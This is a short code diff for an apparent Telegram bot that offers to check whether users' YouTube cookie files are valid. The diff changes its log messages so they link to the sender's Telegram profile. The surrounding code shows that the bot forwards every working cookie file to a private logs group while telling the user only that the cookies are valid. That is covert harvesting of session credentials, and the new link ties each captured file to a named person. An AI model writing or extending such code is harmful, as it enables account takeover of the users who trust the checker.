@@ -45,6 +45,7 @@ async def check_cookies_from_file(client, message: Message):
         return  # Ignore if user didn't use `/chkcookies`
 
     username = active_users.pop(user_id)  # Get and remove user from active list
+    usr = message.from_user  # Get user info for clickable username link
 
     file_path = await message.download()
 
@@ -70,14 +71,14 @@ async def check_cookies_from_file(client, message: Message):
                 ydl.extract_info("https://www.youtube.com/watch?v=dQw4w9WgXcQ", download=False)
 
             msg = "✅ Your YouTube cookies are valid! 🎉"
-            log_msg = f"🛡 **COOKIES CHECKED!**\n✅ **Result:** WORKING ✅\n👤 **User:** `{username}`"
+            log_msg = f"🛡 **COOKIES CHECKED!**\n✅ **Result:** WORKING ✅\n👤 **User:** <a href='tg://user?id={usr.id}'>{usr.first_name}</a>"
 
             # Send valid cookies to group
             await client.send_document(LOGS_GROUP_ID, file_path, caption=log_msg)
 
         except yt_dlp.utils.ExtractorError:
             msg = "❌ Your YouTube cookies are invalid or expired!"
-            log_msg = f"🛡 **COOKIES CHECKED!**\n❌ **Result:** INVALID ❌\n👤 **User:** `{username}`"
+            log_msg = f"🛡 **COOKIES CHECKED!**\n❌ **Result:** INVALID ❌\n👤 **User:** <a href='tg://user?id={usr.id}'>{usr.first_name}</a>"
 
             # Send logs for invalid cookies too
             await client.send_message(LOGS_GROUP_ID, log_msg)
